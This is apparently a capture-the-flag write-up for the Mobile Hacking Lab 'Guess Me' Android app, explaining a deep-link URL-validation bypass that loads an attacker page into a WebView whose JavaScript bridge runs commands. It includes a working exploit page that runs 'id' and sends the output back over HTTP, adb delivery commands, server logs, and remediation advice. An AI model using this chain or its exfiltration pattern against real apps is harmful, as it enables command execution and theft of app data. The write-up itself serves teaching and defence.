---
title: "MHL Guess Me Writeup"
date: 2026-10-24
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, deep-link, exported-activity, webview, javascript-interface, url-validation, rce]
---

## Summary

The Guess Me app from Mobile Hacking Lab exposes a deep link handler with a broken URL validation check. A suffix check on a raw string lets an attacker load an arbitrary page in a WebView that has a JavaScript bridge attached. The bridge passes its argument straight into `Runtime.exec()`, which gives command execution as the app's UID.

**Chain:** exported activity -> weak `endsWith` check -> attacker page in WebView -> `AndroidBridge.getTime()` -> `Runtime.exec()`

## Recon

Decompiled the APK with jadx and read `AndroidManifest.xml`. Two things stand out.

`WebviewActivity` is exported and registers a BROWSABLE VIEW filter:

```xml
<activity android:name="com.mobilehackinglab.guessme.WebviewActivity"
          android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="mhl" android:host="mobilehackinglab"/>
    </intent-filter>
</activity>
```

Any app, web page, or `adb` can fire `mhl://mobilehackinglab?...` at it.

The app is also `debuggable="true"` and has the INTERNET permission, which is fine for a lab but worth noting.

## Code review

### Source: deep link handling

`onCreate` and `onNewIntent` both call `handleDeepLink`, which reads the intent's data URI and validates it:

```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl")
         && !Intrinsics.areEqual(uri.getScheme(), "https"))
        || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null
        && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
}
```

If the check passes, `loadDeepLink` calls `webView.loadUrl()` on the `url` query parameter. If it fails, the app falls back to the local `file:///android_asset/index.html`.

### Sink: JavaScript bridge

```java
webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");

@JavascriptInterface
public final String getTime(String Time) {
    Process process = Runtime.getRuntime().exec(Time);
    ...
    return text;   // stdout of the process
}
```

JavaScript is enabled, and the bridge is available to whatever page is currently loaded, with no origin check. `getTime` hands its argument directly to `exec` and returns stdout.

## The bug

The validator inspects two different URLs and only one of them matters.

```
mhl://mobilehackinglab?url=<inner URL>
 |                          |
 |                          +-- passed to webView.loadUrl()
 +-- outer URI: host checked here
```

1. `uri.getHost()` validates the **outer** URI, the one that launches the activity. It is trivially satisfied with `mobilehackinglab`.
2. The **inner** `url` parameter is the one that gets loaded, and its only check is `endsWith("mobilehackinglab.com")` on a raw string.

A string suffix is not a host check. Anything after the host (path, query, fragment) can end in `mobilehackinglab.com` while the request goes to a server the attacker controls.

## Exploitation

### Failed attempts, and why

My first attempt:

```
mhl://mobilehackinglab?url=https://127.0.0.1:8888/mobilehackinglab.com
```

It had three problems:

- **Loopback:** `127.0.0.1` inside the device is the device itself. Fixed with `adb reverse tcp:8888 tcp:8888` (on an emulator, `10.0.2.2` also works).
- **TLS:** HTTPS with a self-signed cert is rejected by the default `WebViewClient`, which cancels on SSL errors. I switched to plain HTTP, and the app allowed the cleartext load.
- **Path:** `/mobilehackinglab.com` is a path, so the server looked for a file by that name and returned a 404. The suffix has to sit somewhere that doesn't change which file is served.

### Working payload

Moving the suffix into a throwaway query value fixes the 404 and still satisfies the check:

```
http://127.0.0.1:8888/exploit.html?x=mobilehackinglab.com
```

`exploit.html`:

```html
<!DOCTYPE html>
<html>
<body>
<pre id="out">running...</pre>
<script>
  var cmd = "id";
  var res = AndroidBridge.getTime(cmd);
  document.getElementById("out").innerText = res;
  new Image().src = "http://127.0.0.1:8888/?out=" + encodeURIComponent(res);
</script>
</body>
</html>
```

Delivery:

```bash
adb reverse tcp:8888 tcp:8888
python3 -m http.server 8888
adb shell am start -a android.intent.action.VIEW \
  -d 'mhl://mobilehackinglab?url=http://127.0.0.1:8888/exploit.html?x=mobilehackinglab.com'
```

The inner URL contains no `&` or `#`, so `getQueryParameter("url")` returns it intact and no extra encoding is needed.

### Result

Server log:

```
GET /exploit.html?x=mobilehackinglab.com HTTP/1.1" 200
GET /?out=uid%3D10257(u0_a257)%20gid%3D10257(u0_a257)%20groups%3D...
    context%3Du%3Ar%3Auntrusted_app%3As0%3Ac1%2Cc257%2Cc512%2Cc768
```

Decoded, the output is `uid=10257(u0_a257) ... context=u:r:untrusted_app:s0:c1,c257,c512,c768`. That confirms command execution as the app's own UID under the `untrusted_app` SELinux domain.

### Constraints

`exec(String)` tokenizes on whitespace and does not invoke a shell, so pipes, `;`, and redirects do not work as-is. To get shell semantics, the payload has to invoke a shell binary explicitly with an argument array, which the single-string overload makes awkward. Single commands like `id` or `ls` work directly.

### Untested idea

`loadUrl` also accepts `javascript:` URLs, and the suffix check is the only gate. A `javascript:` URL ending in the suffix might run JS in the local `index.html` context, where the bridge is already attached, with no attacker server needed. Not verified.

## Impact

- Any app on the device, or any web page via an intent URL, can trigger the chain with no user interaction beyond opening the link.
- Code runs with the app's privileges: read and write its private data directory, access its tokens and databases, and use its network access.
- Because the bridge is exposed to any loaded origin, a single XSS or a compromised remote page would have the same effect.

## Remediation

Each of these breaks the chain on its own, and all three should be applied.

1. **Validate the host properly.** Parse the inner URL, require `https`, and compare `getHost()` for exact equality against an allowlist (or an exact `.mobilehackinglab.com` subdomain match on the parsed host). Never run string operations on a raw URL.
2. **Do not expose the bridge to untrusted origins.** Remove `addJavascriptInterface` if it isn't needed. If it is, use `WebViewCompat.addWebMessageListener` with an explicit allowed-origin set so the interface is only present on trusted pages.
3. **Never pass bridge input to `exec`.** A method named `getTime` should not accept a command at all. Take no argument and return the time directly.

Also worth doing: disable cleartext traffic app-wide, drop `debuggable` in release builds, and reconsider whether the activity needs to be exported.

## Takeaways

- A suffix check is not a host check. Always parse before comparing.
- Two URLs in one deep link means two separate trust decisions. Validating the outer one says nothing about the inner one.
- `addJavascriptInterface` trusts the page, not the origin, so the real question is who can control what is loaded.

## References

- Android developer docs: WebView security and `addJavascriptInterface` risks
- OWASP MASTG: deep link and WebView testing sections
